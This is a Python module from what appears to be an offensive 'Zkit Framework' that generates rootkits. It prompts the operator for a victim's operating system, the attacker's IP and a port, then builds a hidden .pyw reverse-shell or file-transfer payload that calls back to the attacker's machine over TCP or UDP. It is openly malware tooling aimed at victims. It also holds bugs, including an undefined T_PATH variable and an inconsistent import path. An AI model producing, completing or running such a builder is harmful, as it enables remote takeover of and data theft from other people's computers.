"Zkit Framework Rootkit generator . this module talks to _get_rootkit"
import socket as s
import sys
from core.helper_core import Color, create_file, notify, ask_for # NOQA
from core.lib.randoms import random_str
def get_rootkit():
    t_path = sys.path[0] + "\\Builded\\Rootkit\\"
    _, red, green, _, blue, _, _, _, reset = Color().GetAllColors()
    print("Please Choose Rootkit Type:\n"
          + red + "{1}--> Reverse Shell\n"
          + green + '{2}--> File Transfer (+ Reverse Shell)\n' + reset)
    r_type = str(input("..> "))
    print(
        "A " + red + "RootKit" + reset + " ?"
        + "What is The Connection Type : \n"
        + red + "{1}--> TCP\n"
        + green + "{2}--> UDP\n"
        + blue + "{000}--> Back To Main Menu" + reset
    )
    choice = str(input("..> ")).replace("1", "TCP").replace("2", "UDP")

    if choice == "000":
        pass

    elif choice == "TCP" or choice == "UDP":
        # Getting Some Required Information : PATH Of Rootkit , Attacker_Ip : Ip or 
        # Domain to Send data to it
        # Attacker_Port : An open port on attacker machine

        # Getting File PATH
        u_path = t_path + ask_for("Enter A Name For Your File .\nIt Will Be --> {}".format(T_PATH) +
                                 "YOUR_FILE_NAME.pyw : ", 'Using \\| As File Path',) + ".pyw"

        # Very important
        notify("question",
               "Whats Your Victim(s) Operating System(s)" + red +
               " {W}indows" + green + " {L}inux" + reset

               )
        victim_os = str(input("..> ")).upper()

        if victim_os == "000":
            pass

        elif victim_os in ["W", "L"]:
            victim_os = victim_os.replace("W", "WINDOWS", -1)
            victim_os = victim_os.replace("L", "LINUX", -1)
            # Getting Attacker ip
            attacker_ip = ask_for("Whats You IP Address, Host Name Or Domain Name " +
                                  "Left it to empty to use your own hostname (automic) : ",
                                  "Using IP \\| As Attacker_ip", default=['', s.gethostbyname],
                                  args=s.gethostname()
                                  )
            # Getting an open port on attacker port

            attacker_port = ask_for("Whats An Open Port In Your Machine " +
                                    "Left It '-1' To Use Default Port (1534 Eclipse's "
                                    "default communicate port) : ", "Using \\| As Attacker_Port",
                                    default=[-1, 1534], type=int,
                                    )
            strs = []
            for _ in range(0, 3):
                strs.append(random_str())
            if r_type == '1':
                if choice == 'TCP':
                    import core.lib.payloads.rootkit.reverse_tcp as r # NOQA
                elif choice == 'UDP':
                    import core.lib.payloads.rootkit.reverse_udp as r # NOQA
            elif r_type == '2':
                if choice == 'TCP':
                    import core.lib.payloads.rootkit.ft_tcp as r # NOQA
                elif choice == 'UDP':
                    import core.lib._payloads.rootkit.ft_udp as r # NOQA
                    
            return (r._get_rootkit(
                    attacker_ip, attacker_port, victim_os, strs), create_file(u_path))
    else:
        print("Port is either TCP or UDP but yours is not one.try again")
        
